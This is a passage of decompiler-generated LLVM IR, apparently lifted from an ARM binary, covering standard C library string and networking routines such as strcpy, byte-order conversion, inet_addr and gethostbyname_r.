  uselistorder i32 %v4_ac78, { 1, 0 }
  uselistorder i32 %v2_ac78, { 0, 2, 1 }
  uselistorder i32 %v0_acdc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_ac6c, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_ac44, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_ac40, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_ac40, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_ad38, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_acc0, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_ad48 = sub i32 %arg1, %tmp
  %v1_ad4c = add i32 %v2_ad48, -1
  store i32 %v1_ad4c, i32* %r2.global-to-local, align 4
  %v2_ad504 = load i8, i8* %arg2, align 1
  %v5_ad506 = add i32 %tmp, 1
  store i32 %v5_ad506, i32* %r1.global-to-local, align 4
  %v2_ad547 = icmp eq i8 %v2_ad504, 0
  store i1 %v2_ad547, i1* %cpsr_z.global-to-local, align 1
  %v5_ad588 = inttoptr i32 %arg1 to i8*
  store i8 %v2_ad504, i8* %v5_ad588, align 1
  %v0_ad5c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ad5c9, label %dec_label_pc_ad60, label %dec_label_pc_ad50.dec_label_pc_ad50_crit_edge

dec_label_pc_ad50.dec_label_pc_ad50_crit_edge:    ; preds = %entry, %dec_label_pc_ad50.dec_label_pc_ad50_crit_edge
  %v0_ad50.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_ad58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ad50 = inttoptr i32 %v0_ad50.pre to i8*
  %v2_ad50 = load i8, i8* %v1_ad50, align 1
  %v5_ad50 = add i32 %v0_ad50.pre, 1
  store i32 %v5_ad50, i32* %r1.global-to-local, align 4
  %v2_ad54 = icmp eq i8 %v2_ad50, 0
  store i1 %v2_ad54, i1* %cpsr_z.global-to-local, align 1
  %v4_ad58 = add i32 %v5_ad50, %v3_ad58.pre
  %v5_ad58 = inttoptr i32 %v4_ad58 to i8*
  store i8 %v2_ad50, i8* %v5_ad58, align 1
  %v0_ad5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ad5c, label %dec_label_pc_ad60, label %dec_label_pc_ad50.dec_label_pc_ad50_crit_edge

dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad50.dec_label_pc_ad50_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ad50.dec_label_pc_ad50_crit_edge, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_1b8ac.81 to i32), i32* @r2, align 4
  %v0_ad68 = call i32 @strtok_r()
  %v0_ad6c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ad6c, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_ad6c = load i32, i32* @ip, align 4
  %v5_ad6c = udiv i32 %v2_ad6c, 131072
  %v6_ad6c = and i32 %v5_ad6c, %arg1
  store i32 %v6_ad6c, i32* @fp, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_ad68

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ad78 = and i32 %arg1, ptrtoint (i32* @global_var_ff00.82 to i32)
  %v1_ad74 = udiv i32 %arg1, 256
  %v3_ad7c = and i32 %v1_ad74, 65280
  %v3_ad80 = mul i32 %v1_ad78, 256
  %v4_ad84 = mul i32 %arg1, 16777216
  %v5_ad84 = or i32 %v3_ad80, %v4_ad84
  %v4_ad88 = udiv i32 %arg1, 16777216
  %v5_ad88 = or i32 %v3_ad7c, %v4_ad88
  %v2_ad8c = or i32 %v5_ad84, %v5_ad88
  ret i32 %v2_ad8c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_ad9c = and i32 %tmp, and (i32 ptrtoint (i32* @global_var_ff00.82 to i32), i32 16776960)
  %tmp1 = udiv i32 %arg1, 256
  %v4_ada0 = urem i32 %tmp1, 256
  %v5_ada0 = or i32 %v4_ada0, %v1_ad9c
  ret i32 %v5_ada0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_adb0 = and i32 %arg1, ptrtoint (i32* @global_var_ff00.82 to i32)
  %v1_adac = udiv i32 %arg1, 256
  %v3_adb4 = and i32 %v1_adac, 65280
  %v3_adb8 = mul i32 %v1_adb0, 256
  %v4_adbc = mul i32 %arg1, 16777216
  %v5_adbc = or i32 %v3_adb8, %v4_adbc
  %v4_adc0 = udiv i32 %arg1, 16777216
  %v5_adc0 = or i32 %v3_adb4, %v4_adc0
  %v2_adc4 = or i32 %v5_adbc, %v5_adc0
  ret i32 %v2_adc4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_add4 = and i32 %tmp, and (i32 ptrtoint (i32* @global_var_ff00.82 to i32), i32 16776960)
  %tmp1 = udiv i32 %arg1, 256
  %v4_add8 = urem i32 %tmp1, 256
  %v5_add8 = or i32 %v4_add8, %v1_add4
  ret i32 %v5_add8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_ade4 = ptrtoint i32* %stack_var_-8 to i32
  %v0_adec = load i32, i32* @r0, align 4
  %v2_adec = inttoptr i32 %v0_adec to i8*
  %v3_adec = call i32 @inet_aton(i8* %v2_adec, i32 %v2_ade4)
  %v2_adf0 = icmp eq i32 %v3_adec, 0
  br i1 %v2_adf0, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_adf8 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_ae00 = phi i32 [ -1, %entry ], [ %v3_adf8, %bb ]
  ret i32 %v5_ae00

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_ae04 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_ae10 = call i32 @__GI___h_errno_location()
  %v2_ae14 = ptrtoint i32* %stack_var_-12 to i32
  %v0_ae20 = load i32, i32* @r4, align 4
  %v7_ae30 = call i32 @gethostbyname_r(i32 %v0_ae20, i32* nonnull @global_var_1ba7c.84, i32 ptrtoint (i32* @global_var_1b8b0.86 to i32), i32 460, i32 %v2_ae14, i32 %v0_ae10)
  %v3_ae34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ae04, i32* @r4, align 4
  ret i32 %v3_ae34
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ae48 = load i32, i32* @r5, align 4
  %v9_ae48 = load i32, i32* @r6, align 4
  %v12_ae48 = load i32, i32* @r7, align 4
  %v15_ae48 = load i32, i32* @r8, align 4
  %v24_ae48 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_ae58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ae58, i32* @fp, align 4
  %v2_ae58 = icmp eq i32 %v0_ae58, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_ae68 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_ae68, align 4
  br i1 %v2_ae58, label %bb, label %dec_label_pc_ae74

bb:                                               ; preds = %entry
  %v1_ae6c = load i32, i32* %r0.global-to-local, align 4
  %v2_ae6c = add i32 %v1_ae6c, 22
  store i32 %v2_ae6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b198

dec_label_pc_ae74:                                ; preds = %entry
  %v0_ae74 = call i32 @__errno_location()
  store i32 %v0_ae74, i32* %r0.global-to-local, align 4
  %v3_ae78 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_ae78, i32* %ip.global-to-local, align 4
  %v1_ae7c = inttoptr i32 %v0_ae74 to i32*
  %v2_ae7c = load i32, i32* %v1_ae7c, align 4
  store i32 %v2_ae7c, i32* @r8, align 4
  %v0_ae80 = load i32, i32* @r6, align 4
  store i32 %v0_ae80, i32* %v1_ae7c, align 4
  %v0_ae84 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_ae74, i32* @r5, align 4
  %v0_ae94 = load i32, i32* @fp, align 4
  store i32 %v0_ae94, i32* %r0.global-to-local, align 4
  %v0_ae98 = load i32, i32* @sl, align 4
  store i32 %v0_ae98, i32* %r2.global-to-local, align 4
  %v0_ae9c = load i32, i32* @r7, align 4
  store i32 %v0_ae9c, i32* %r3.global-to-local, align 4
  %v0_aea0 = load i32, i32* @r4, align 4
  %v7_aea8 = call i32 @__get_hosts_byname_r(i32 %v0_ae94, i32 2, i32 %v0_ae98, i32 %v0_ae9c, i32 %v0_aea0, i32 %v0_ae84, i32 %arg6)
  store i32 %v7_aea8, i32* %r0.global-to-local, align 4
  %v2_aeac = icmp eq i32 %v7_aea8, 0
  br i1 %v2_aeac, label %dec_label_pc_b198, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae74
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_aeb8 = inttoptr i32 %arg6 to i32*
  %v2_aeb8 = load i32, i32* %v1_aeb8, align 4
  store i32 %v2_aeb8, i32* %r3.global-to-local, align 4
  %v7_aebc = icmp eq i32 %v2_aeb8, 1
  br i1 %v7_aebc, label %dec_label_pc_aee0, label %dec_label_pc_aec4

dec_label_pc_aec4:                                ; preds = %dec_label_pc_aeb4
  %v7_aec4 = icmp eq i32 %v2_aeb8, 4
  br i1 %v7_aec4, label %dec_label_pc_aee0, label %dec_label_pc_aecc

dec_label_pc_aecc:                                ; preds = %dec_label_pc_aec4
  %v3_aecc = icmp eq i32 %v2_aeb8, -1
  br i1 %v3_aecc, label %dec_label_pc_aed4, label %dec_label_pc_b198

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aecc
  %v0_aed4 = load i32, i32* @r5, align 4
  %v1_aed4 = inttoptr i32 %v0_aed4 to i32*
  %v2_aed4 = load i32, i32* %v1_aed4, align 4
  store i32 %v2_aed4, i32* %r3.global-to-local, align 4
  %v7_aed8 = icmp eq i32 %v2_aed4, 2
  br i1 %v7_aed8, label %dec_label_pc_aee0, label %dec_label_pc_b198

dec_label_pc_aee0:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_aec4, %dec_label_pc_aeb4
  %v0_aee0 = load i32, i32* @r7, align 4
  %v1_aee0 = sub i32 0, %v0_aee0
  %v1_aee4 = urem i32 %v1_aee0, 4
  store i32 %v1_aee4, i32* %r3.global-to-local, align 4
  %v2_aee4 = icmp eq i32 %v1_aee4, 0
  %v0_aee8 = load i32, i32* @r8, align 4
  %v1_aee8 = load i32, i32* @r5, align 4
  %v2_aee8 = inttoptr i32 %v1_aee8 to i32*
  store i32 %v0_aee8, i32* %v2_aee8, align 4
  %v0_af08.pre = load i32, i32* @r4, align 4
  br i1 %v2_aee4, label %dec_label_pc_af00, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee0
  %v1_aef0 = load i32, i32* %r3.global-to-local, align 4
  %v2_aef0 = sub i32 %v0_af08.pre, %v1_aef0
  %v3_aef0 = icmp ult i32 %v0_af08.pre, %v1_aef0
  br i1 %v3_aef0, label %dec_label_pc_b194, label %dec_label_pc_aef8

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aef0
  store i32 %v2_aef0, i32* @r4, align 4
  %v0_aefc = load i32, i32* @r7, align 4
  %v2_aefc = add i32 %v0_aefc, %v1_aef0
  store i32 %v2_aefc, i32* @r7, align 4
  br label %dec_label_pc_af00

dec_label_pc_af00:                                ; preds = %dec_label_pc_aee0, %dec_label_pc_aef8
  %v0_af08 = phi i32 [ %v2_aef0, %dec_label_pc_aef8 ], [ %v0_af08.pre, %dec_label_pc_aee0 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_aeb8, align 4
  %tmp31 = icmp ult i32 %v0_af08, 4
  br i1 %tmp31, label %dec_label_pc_b194, label %dec_label_pc_af14

dec_label_pc_af14:                                ; preds = %dec_label_pc_af00
  %v0_af14 = load i32, i32* @r4, align 4
  %v1_af14 = add i32 %v0_af14, -4
  store i32 %v1_af14, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_af14, 8
  br i1 %tmp32, label %dec_label_pc_b194, label %dec_label_pc_af20

dec_label_pc_af20:                                ; preds = %dec_label_pc_af14
  %v1_af20 = add i32 %v0_af14, -12
  store i32 %v1_af20, i32* %r3.global-to-local, align 4
  %v0_af24 = load i32, i32* @r7, align 4
  %v1_af24 = add i32 %v0_af24, 4
  store i32 %v1_af24, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_af30 = inttoptr i32 %v1_af24 to i32*
  store i32 %v0_af24, i32* %v3_af30, align 4
  %v0_af34 = load i32, i32* @r5, align 4
  %v1_af34 = load i32, i32* @sb, align 4
  %v2_af34 = add i32 %v1_af34, 4
  %v3_af34 = inttoptr i32 %v2_af34 to i32*
  store i32 %v0_af34, i32* %v3_af34, align 4
  %tmp33 = icmp ult i32 %v1_af20, 32
  br i1 %tmp33, label %dec_label_pc_b194, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af20
  %v0_af3c = load i32, i32* @r4, align 4
  %v1_af3c = add i32 %v0_af3c, -44
  store i32 %v1_af3c, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_af3c, 256
  br i1 %tmp34, label %dec_label_pc_b194, label %dec_label_pc_af48

dec_label_pc_af48:                                ; preds = %dec_label_pc_af3c
  %v0_af48 = load i32, i32* @r7, align 4
  %v1_af48 = add i32 %v0_af48, 44
  store i32 %v1_af48, i32* @r6, align 4
  %v1_af4c = add i32 %v0_af48, 12
  store i32 %v1_af4c, i32* %r3.global-to-local, align 4
  %v0_af50 = load i32, i32* @fp, align 4
  store i32 %v0_af50, i32* @r1, align 4
  store i32 %v1_af3c, i32* %r2.global-to-local, align 4
  store i32 %v1_af48, i32* %r0.global-to-local, align 4
  %v3_af60 = call i32 @strncpy(i32 %v1_af48, i32 %v0_af50, i32 %v1_af3c)
  store i32 %v1_af4c, i32* %ip.global-to-local, align 4
  %v0_af68 = load i32, i32* @r6, align 4
  %v1_af68 = load i32, i32* @r7, align 4
  %v2_af68 = add i32 %v1_af68, 12
  %v3_af68 = inttoptr i32 %v2_af68 to i32*
  store i32 %v0_af68, i32* %v3_af68, align 4
  %v0_af6c = load i32, i32* @fp, align 4
  store i32 %v0_af6c, i32* %r0.global-to-local, align 4
  %v0_af70 = load i32, i32* @r5, align 4
  %v1_af70 = load i32, i32* %ip.global-to-local, align 4
  %v2_af70 = add i32 %v1_af70, 4
  %v3_af70 = inttoptr i32 %v2_af70 to i32*
  store i32 %v0_af70, i32* %v3_af70, align 4
  %v0_af74 = load i32, i32* @r7, align 4
  %v2_af78 = inttoptr i32 %v0_af6c to i8*
  %v3_af78 = call i32 @inet_aton(i8* %v2_af78, i32 %v0_af74)
  store i32 %v3_af78, i32* %r0.global-to-local, align 4
  %v2_af7c = icmp eq i32 %v3_af78, 0
  br i1 %v2_af7c, label %dec_label_pc_afc0, label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_af48
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_af8c = load i32, i32* @sl, align 4
  %v2_af8c = add i32 %v1_af8c, 8
  %v3_af8c = inttoptr i32 %v2_af8c to i32*
  store i32 2, i32* %v3_af8c, align 4
  %v0_af90 = load i32, i32* %r3.global-to-local, align 4
  %v2_af90 = mul i32 %v0_af90, 2
  %v1_af94 = load i32, i32* @sl, align 4
  %v2_af94 = add i32 %v1_af94, 12
  %v3_af94 = inttoptr i32 %v2_af94 to i32*
  store i32 %v2_af90, i32* %v3_af94, align 4
  %v3_af98 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_af98, i32* %r2.global-to-local, align 4
  store i32 %v1_af4c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_afa4 = load i32, i32* @r5, align 4
  store i32 %v0_afa4, i32* %r0.global-to-local, align 4
  %v0_afa8 = load i32, i32* @sl, align 4
  %v2_afa8 = inttoptr i32 %v3_af98 to i32*
  store i32 %v0_afa8, i32* %v2_afa8, align 4
  %v0_afac = load i32, i32* @r6, align 4
  %v1_afac = load i32, i32* @sl, align 4
  %v2_afac = inttoptr i32 %v1_afac to i32*
  store i32 %v0_afac, i32* %v2_afac, align 4
  %v0_afb0 = load i32, i32* @sb, align 4
  %v1_afb0 = load i32, i32* @sl, align 4
  %v2_afb0 = add i32 %v1_afb0, 16
  %v3_afb0 = inttoptr i32 %v2_afb0 to i32*
  store i32 %v0_afb0, i32* %v3_afb0, align 4
  %v0_afb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afb4 = load i32, i32* @sl, align 4
  %v2_afb4 = add i32 %v1_afb4, 4
  %v3_afb4 = inttoptr i32 %v2_afb4 to i32*
  store i32 %v0_afb4, i32* %v3_afb4, align 4
  %v0_afb8 = load i32, i32* @r5, align 4
  %v1_afb8 = load i32, i32* %ip.global-to-local, align 4
  %v2_afb8 = inttoptr i32 %v1_afb8 to i32*
  store i32 %v0_afb8, i32* %v2_afb8, align 4
  br label %dec_label_pc_b198

dec_label_pc_afc0:                                ; preds = %dec_label_pc_af48
  %v2_afc0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_afc0, i32* @r5, align 4
  %v1_afc4 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_1b714.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_afc0, i32* @r0, align 4
  store i32 49340, i32* %r3.global-to-local, align 4
  %v1_afdc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b714.88 to i32), i32* %r0.global-to-local, align 4
  %v1_afec = call i32 @__pthread_return_0()
  store i32 %v2_afc0, i32* @r0, align 4
  %v2_aff8 = load i32, i32* @global_var_1dbb4.94, align 4
  store i32 %v2_aff8, i32* @r4, align 4
  store i32 49340, i32* %r3.global-to-local, align 4
  %v1_b008 = call i32 @__pthread_return_void()
  %v2_b014 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1dba8.97 to i32), i32* %r3.global-to-local, align 4
  %v0_b020 = load i32, i32* @fp, align 4
  store i32 %v0_b020, i32* %r0.global-to-local, align 4
  %v2_b024 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_b024, i32* %ip.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r2.global-to-local, align 4
  %v6_b03c = inttoptr i32 %v0_b020 to i8*
  %v7_b03c = call i32 @__dns_lookup(i8* %v6_b03c, i32 1, i32 %v0_b028, i32 ptrtoint (i32* @global_var_1dba8.97 to i32), i32 %v2_b014, i32 %v2_b024)
  store i32 %v7_b03c, i32* %r0.global-to-local, align 4
  %v1_b040 = icmp slt i32 %v7_b03c, 0
  br i1 %v1_b040, label %.dec_label_pc_b16c_crit_edge, label %dec_label_pc_b050

.dec_label_pc_b16c_crit_edge:                     ; preds = %dec_label_pc_afc0
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b16c

dec_label_pc_b050:                                ; preds = %dec_label_pc_afc0
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_b064 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_b064, 255
  br i1 %tmp35, label %dec_label_pc_b100, label %dec_label_pc_b06c

dec_label_pc_b06c:                                ; preds = %dec_label_pc_b050
  %v3_b06c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_b06c, i32* %r0.global-to-local, align 4
  %v1_b070 = call i32 @free(i32 %v3_b06c)
  %v3_b074 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b074, i32* %r0.global-to-local, align 4
  %v1_b078 = call i32 @free(i32 %v3_b074)
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_aeb8, align 4
  br label %dec_label_pc_b198

dec_label_pc_b100:                                ; preds = %dec_label_pc_b050
  %v3_b104.pre = load i32, i32* %stack_var_-96, align 4
  %v0_b108.pre = load i32, i32* @r6, align 4
  store i32 %v1_b064, i32* %r2.global-to-local, align 4
  store i32 %v3_b104.pre, i32* @r1, align 4
  store i32 %v0_b108.pre, i32* %r0.global-to-local, align 4
  %v3_b10c = call i32 @strncpy(i32 %v0_b108.pre, i32 %v3_b104.pre, i32 %v1_b064)
  %v3_b110 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_b110, i32* %r0.global-to-local, align 4
  %v1_b114 = call i32 @free(i32 %v3_b110)
  store i32 %v1_b114, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_b11c = icmp eq i32 %tmp7, 1
  br i1 %v7_b11c, label %dec_label_pc_b124, label %dec_label_pc_b178

dec_label_pc_b124:                                ; preds = %dec_label_pc_b100
  store i32 4, i32* @r2, align 4
  %v0_b12c = load i32, i32* @r7, align 4
  store i32 %v0_b12c, i32* @r0, align 4
  %v0_b130 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_af4c, i32* %r2.global-to-local, align 4
  %v1_b13c = load i32, i32* @sl, align 4
  %v2_b13c = add i32 %v1_b13c, 8
  %v3_b13c = inttoptr i32 %v2_b13c to i32*
  store i32 2, i32* %v3_b13c, align 4
  %v0_b140 = load i32, i32* %r3.global-to-local, align 4
  %v2_b140 = mul i32 %v0_b140, 2
  store i32 %v2_b140, i32* %r3.global-to-local, align 4
  %v1_b144 = load i32, i32* @sl, align 4
  %v2_b144 = add i32 %v1_b144, 12
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v2_b140, i32* %v3_b144, align 4
  %v3_b148 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b148, i32* %r0.global-to-local, align 4
  %v0_b14c = load i32, i32* @r6, align 4
  %v1_b14c = load i32, i32* @sl, align 4
  %v2_b14c = inttoptr i32 %v1_b14c to i32*
  store i32 %v0_b14c, i32* %v2_b14c, align 4
  %v0_b150 = load i32, i32* @sb, align 4
  %v1_b150 = load i32, i32* @sl, align 4
  %v2_b150 = add i32 %v1_b150, 16
  %v3_b150 = inttoptr i32 %v2_b150 to i32*
  store i32 %v0_b150, i32* %v3_b150, align 4
  %v0_b154 = load i32, i32* %r2.global-to-local, align 4
  %v1_b154 = load i32, i32* @sl, align 4
  %v2_b154 = add i32 %v1_b154, 4
  %v3_b154 = inttoptr i32 %v2_b154 to i32*
  store i32 %v0_b154, i32* %v3_b154, align 4
  %v1_b158 = call i32 @free(i32 %v3_b148)
  %v3_b15c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_b15c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b164 = load i32, i32* @sl, align 4
  %v2_b164 = inttoptr i32 %v3_b15c to i32*
  store i32 %v0_b164, i32* %v2_b164, align 4
  %v0_b168 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_b168, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b16c

dec_label_pc_b16c:                                ; preds = %.dec_label_pc_b16c_crit_edge, %dec_label_pc_b124
  %v0_b170 = phi i32 [ 1, %.dec_label_pc_b16c_crit_edge ], [ %v0_b168, %dec_label_pc_b124 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_b170, i32* %v1_aeb8, align 4
  br label %dec_label_pc_b198

dec_label_pc_b178:                                ; preds = %dec_label_pc_b100
  %v3_b178 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b178, i32* %r0.global-to-local, align 4
  %v1_b17c = call i32 @free(i32 %v3_b178)
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_aeb8, align 4
  br label %dec_label_pc_b198

dec_label_pc_b194:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_af3c, %dec_label_pc_af20, %dec_label_pc_af14, %dec_label_pc_af00
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %bb, %dec_label_pc_aed4, %dec_label_pc_aecc, %dec_label_pc_ae74, %dec_label_pc_b178, %dec_label_pc_b16c, %dec_label_pc_b06c, %dec_label_pc_af88, %dec_label_pc_b194
  store i32 %v6_ae48, i32* @r5, align 4
  store i32 %v9_ae48, i32* @r6, align 4
  store i32 %v12_ae48, i32* @r7, align 4
  store i32 %v15_ae48, i32* @r8, align 4
  store i32 %v24_ae48, i32* @fp, align 4
  %v29_b19c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_b19c

; uselistorder directives
  uselistorder i32 %v2_b140, { 1, 0 }
  uselistorder i32 %v1_b064, { 1, 2, 0 }
  uselistorder i32 %v1_af4c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_af48, { 1, 0, 2 }
  uselistorder i32 %v1_af3c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_af08.pre, { 0, 2, 1 }
  uselistorder i32 %v1_aee4, { 1, 0 }
  uselistorder i32* %v1_aeb8, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_ae58, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 17, 15, 16, 18, 20, 19, 21, 23, 22, 26, 25, 0, 1, 2 }
  uselistorder i32 (i8*, i32)* @inet_aton, { 1, 0 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_b198, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_b194, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_b16c, { 1, 0 }
  uselistorder label %dec_label_pc_af00, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b1bc = load i32, i32* @r4, align 4
  store i32 %v3_b1bc, i32* %stack_var_-8, align 4
  %v5_b1c0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_b1c0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_b1c0, -4095
  br i1 %tmp, label %dec_label_pc_b1e0, label %dec_label_pc_b1d0

dec_label_pc_b1d0:                                ; preds = %entry
  %v0_b1d0 = call i32 @__errno_location()
  %v0_b1d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b1d4 = sub i32 0, %v0_b1d4
  %v2_b1d8 = inttoptr i32 %v0_b1d0 to i32*
